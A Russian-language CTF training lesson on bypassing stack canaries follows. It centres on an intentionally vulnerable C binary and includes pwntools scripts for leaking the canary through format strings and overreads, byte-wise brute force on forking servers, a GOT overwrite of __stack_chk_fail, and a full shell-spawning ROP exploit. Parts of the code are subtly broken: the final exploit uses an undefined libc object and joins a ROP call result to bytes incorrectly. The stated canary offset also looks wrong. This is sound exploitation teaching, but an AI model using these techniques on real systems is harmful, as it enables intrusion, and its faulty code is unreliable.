---
id: pwn-canary-bypass
title: "Stack canary: утечка и обход"
category: pwn
parent: pwn-mitigations-bypass
difficulty: hard
order: 1
tags: [canary, stack-protector, leak, format-string, brute-force]
prerequisites: [pwn-mitigations, pwn-format-string, pwn-got-plt]
useful_for:
  - "CTF Pwn категория"
  - "Обход защит"
  - "Vulnerability research"
estimated_minutes: 55
summary: "Разбираем stack canary: как он устроен и хранится в TLS, какие есть стратегии обхода (утечка, brute-force, partial overwrite) и собираем эксплойт с утечкой через format string."
lab:
  kind: shell
  title: "Практика: где хранится stack canary"
  toolset: [core, objdump, readelf]
  workdir: /home/student/task
  files: [task.md, hardened]
  check: "grep -q 'fs:0x28' answer.txt"
  hints:
    - "Функция `check` собиралась с `-fstack-protector-all`."
    - "В дизассемблере `objdump -d hardened` найди, откуда читается canary и куда кладётся."
    - "Canary хранится в TLS по адресу `fs:0x28`; при несовпадении вызывается `__stack_chk_fail`."
---

## Вопрос, с которого всё начинается

Ты пишешь классический ret2win: заполняешь буфер, дописываешь адрес функции `win`. Запускаешь — и вместо shell получаешь `*** stack smashing detected ***`. Знакомься: **stack canary**.

Это случайное значение, которое компилятор положил между твоим буфером и адресом возврата. Перезаписав адрес, ты задел и канарейку — программа заметила и завершилась. Как её обойти?

## Наш пример: бинарь с canary и format string

```c
#include <stdio.h>
void win(void) { system("/bin/sh"); }
int main(void) {
    char buf[64];
    read(0, buf, 0x100);   // переполнение
    printf(buf);           // format string — канал утечки
    return 0;
}
```

```bash
$ checksec --file=./chall
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Шаг 1. Как устроен canary

При `-fstack-protector` компилятор вставляет в **пролог** функции загрузку значения из `fs:0x28` (это TLS — thread-local storage, область на поток) в стек, а в **эпилог** — сравнение с `fs:0x28` и вызов `__stack_chk_fail` при несовпадении.

Значение берётся из `/dev/urandom` при запуске процесса и **заканчивается нулевым байтом** — чтобы строковые функции обрывались и не раскрывали канарейку целиком.

Раскладка фрейма:

| Смещение | Содержимое |
|---|---|
| 0x00..0x3f | `buf[64]` |
| 0x40..0x47 | canary (младший байт — `\x00`) |
| 0x48..0x4f | сохранённый `rbp` |
| 0x50..0x57 | адрес возврата |

Значит, чтобы добраться до адреса возврата, нужно перезаписать и canary — а без истинного значения это падение.

## Шаг 2. Стратегия 1: не трогать canary

Если в функции есть **указатель на функцию**, сохранённый на стеке ниже canary, можно перезаписать именно его, не доходя до канарейки. Классика — цикл, читающий структуру, где рядом лежат буфер и указатель-обработчик. Сюда же относится **partial overwrite**: изменение лишь младших байт сохранённого указателя на объект в той же странице.

## Шаг 3. Стратегия 2: утечка canary

Наш бинарь печатает буфер через `printf(buf)` — это и есть канал. Формат-строка читает канарейку как аргумент стека:

```python
from pwn import *
p = process('./chall')
p.sendline(b'%9$p')            # canary часто 9-й аргумент на amd64
canary = int(p.recvline().strip(), 16)
log.success(f'canary = {hex(canary)}')
```

Позицию подбирают перебором `%N$p` (с 6 до 30) или через `pwnlib.fmtstr.FmtStr`. Иногда канарейка утекает и через `puts(buf)`/`write(1, buf, n)`: если `read` заполнил буфер целиком без нулевого терминатора, вывод захватит байты canary.

```python
p.sendline(b'A'*0x40)          # ровно размер буфера, без \x00 в конце
leak = p.recvline().strip()
canary = u64(leak[0x40:0x48])  # байты после буфера
```

## Шаг 4. Стратегия 3: брутфорс по байтам

Если сервер **форкается** на каждый коннект, канарейка наследуется дочерними процессами и не меняется. Тогда её можно перебирать побайтово: при неверном байте процесс падает, при верном — идёт дальше. Младший байт известен (`\x00`), остальные 7 перебираются по 256 — максимум 1792 попытки.

```python
canary = b'\x00'
for i in range(1, 8):
    for b in range(256):
        p = process('./chall')
        p.send(b'A'*0x40 + canary + bytes([b]))
        try:
            if b'ok' in p.recv(timeout=0.2):
                canary += bytes([b]); break
        except EOFError:
            pass
```

Работает только если `fork` наследует одно и то же canary. Проверка: одинаковы ли утечки между двумя подключениями.

## Шаг 5. Собираем payload с canary

```python
payload  = b'A' * 0x40            # до canary
payload += p64(canary)            # канарейка на место
payload += p64(0)                 # фиктивный rbp
payload += p64(rop_chain)         # возврат
p.sendline(payload)
```

Порядок критичен: canary идёт **ровно** на своё место; сдвиг на байт — падение до возврата. Младший байт `\x00` означает, что строковые функции (`gets`, `strcpy`) могут оборвать запись — тогда используй `read`.

## Шаг 6. Обход через перезапись __stack_chk_fail

При Partial RELRO доступна запись в GOT. Можно вообще не угадывать канарейку: перезаписать `__stack_chk_fail@got` на адрес `win`. Тогда при неверном canary вместо аборта вызовется полезная функция:

```python
payload = fmtstr_payload(6, {elf.got['__stack_chk_fail']: elf.symbols['win']})
```

Элегантный трюк: не нужно знать canary вовсе.

## Шаг 7. Полный эксплойт с утечкой

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
OFFSET_CANARY, OFFSET_RET = 0x40, 0x48

p = process('./chall')
p.sendline(b'%9$p.%11$p')                  # canary + libc-адрес
canary_s, libc_s = p.recvline().strip().split(b'.')
canary = int(canary_s, 16)
libc.address = int(libc_s, 16) - 0x29d90
payload  = b'A' * OFFSET_CANARY
payload += p64(canary)
payload += p64(0)
payload += p64(ROP(elf).find_gadget(['ret']).address)   # выравнивание
payload += ROP(libc).call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))]) or b''
p.sendline(payload)
p.interactive()
```

Обрати внимание: canary на смещении `0x40`, `rbp` фиктивный, перед цепочкой — `ret` для выравнивания.

## Сводка по обходу canary

Ключевая мысль: canary защищает только от **слепой** перезаписи адреса возврата. Как только у тебя есть любой канал чтения — печать буфера, format string, `environ` — значение canary перестаёт быть секретом, и переполнение снова становится управляемым. Если канала чтения нет, ищи путь не задевать канарейку (указатели ниже неё, partial overwrite) либо, на fork-сервере, применяй побайтовый брутфорс. В реальном коде canary часто утекает через неаккуратный `printf(buf)` или через `write` всего буфера — аудит таких мест окупается. Помни и про перехват `__stack_chk_fail`: если GOT записываем, можно превратить провал проверки в вызов `win`.

## Утечка через переполнение read и printf

Самый надёжный способ — заставить программу вывести canary. Функции `write(1, buf, n)` и `puts(buf)` печатают содержимое буфера; если `read` заполнил буфер целиком (без нулевого терминатора), а следующий вывод печатает больше, чем размер буфера, в утечку попадут байты canary. Формат-строка даёт ещё проще: `%9$p` или `%15$p` печатает значение аргумента из стека, где `printf` хранит сохранённые регистры. Позиция подбирается эмпирически — перебирай N.

Иногда canary утекает через `environ` или `argv`: если программа печатает адрес стека, можно вычислить позицию canary в памяти и прочитать его через произвольное чтение. Комбинируй утечку стека (для адреса) и format string (для чтения по адресу).

## На что смотреть дальше

- **Canary заканчивается `\x00`** — строковая функция оборвёт ввод; нужен `read`.
- **Позиция `%N$p` зависит от задачи** — перебирай N.
- **Брутфорс только на fork-сервере**, иначе бессмысленно.
- **Не путай canary с ASLR** — canary это значение, ASLR это адрес.
- **`__stack_chk_fail` тоже перехватывается** при writable GOT.
- **Мусорный canary** — падение до `ret`.

## Что мы теперь знаем

- Canary — случайное значение в TLS, копируемое на стек перед адресом возврата.
- Младший байт всегда `\x00`, проверка идёт с `fs:0x28`.
- Обходы: не трогать (указатели ниже), утечка (`%p`/overread), брутфорс (fork), перехват `__stack_chk_fail`.
- Утечка через format string — самый надёжный путь.
- Payload собирается с канарейкой точно на её смещении.

## Квиз

Проверь себя.

```quiz
- question: "Какое значение имеет младший байт canary?"
  options:
    - "0x00"
    - "0xff"
    - "случайное"
    - "0x7f"
  answer: 0
  explanation: "Младший байт canary — 0x00, чтобы строковые функции обрывались."
- question: "Где хранится «эталон» canary?"
  options:
    - "В TLS (fs:0x28 на x86-64)"
    - "В GOT"
    - "В куче"
    - "В .text"
  answer: 0
  explanation: "Canary хранится в TLS и копируется на стек; сравнение идёт с TLS-значением."
- question: "Когда работает brute-force canary?"
  options:
    - "Когда сервис форкает и canary наследуется"
    - "Всегда"
    - "Только с ASLR"
    - "Только при PIE"
  answer: 0
  explanation: "При форке canary родителя копируется, поэтому можно подбирать побайтово."
- question: "Как обычно утекают canary?"
  options:
    - "Через format string (%p) или overread"
    - "Через nm"
    - "Через ldd"
    - "Через nmap"
  answer: 0
  explanation: "Format string и overread позволяют прочитать canary со стека."
- question: "Что произойдёт при неверной canary перед возвратом?"
  options:
    - "Вызовется __stack_chk_fail (abort)"
    - "Программа продолжит"
    - "Включится ASLR"
    - "Расширится tcache"
  answer: 0
  explanation: "Проверка вызывает __stack_chk_fail, и процесс завершается."
```

## Куда дальше

В `pwn-pie-bypass` разберём вторую половину этой пары — рандомизацию самого бинаря: как утечь базу кода и как использовать partial overwrite. А пока главное: **canary — не приговор; любой канал чтения (`%p`, overread) превращает его из секрета в известное число.**

## Где пригодится

- **CTF:** Pwn — обход canary.
- **Bug bounty:** эксплуатация защищённых бинарей.
- **Пентест:** разработка эксплойтов.
- **Работа:** vulnerability research.
